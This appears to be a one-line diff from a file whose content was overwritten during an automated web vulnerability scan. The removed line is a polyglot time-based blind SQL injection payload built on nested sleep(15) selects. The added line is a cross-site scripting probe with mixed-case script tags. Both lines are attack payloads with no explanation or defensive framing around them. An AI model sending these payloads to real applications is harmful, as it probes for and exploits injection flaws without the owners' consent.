@@ -1,1 +1,1 @@
-(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
+'"()&%<zzz><ScRiPt >bRC9(9080)</ScRiPt>
